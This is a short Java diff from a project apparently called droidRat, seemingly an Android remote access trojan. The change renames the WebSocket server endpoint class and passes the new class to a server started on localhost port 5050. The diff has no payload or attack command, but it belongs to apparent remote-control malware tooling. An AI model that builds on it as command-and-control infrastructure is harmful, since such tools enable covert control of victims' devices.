@@ -1,6 +1,6 @@
 package com.je_chen.droidRat.main;
 
-import com.je_chen.droidRat.module.WebSocketServerEndPoint;
+import com.je_chen.droidRat.module.DroidRatWebSocketServer;
 import com.je_chen.droidRat.module.process.send.command.process_super.CommandProcess;
 import org.glassfish.tyrus.server.Server;
 
@@ -27,7 +27,7 @@ public class Main {
 
     public static void Run() {
         try {
-            Server server = new Server("localhost", 5050, "", null, WebSocketServerEndPoint.class);
+            Server server = new Server("localhost", 5050, "", null, DroidRatWebSocketServer.class);
             String Control_String;
             try {
                 server.start();
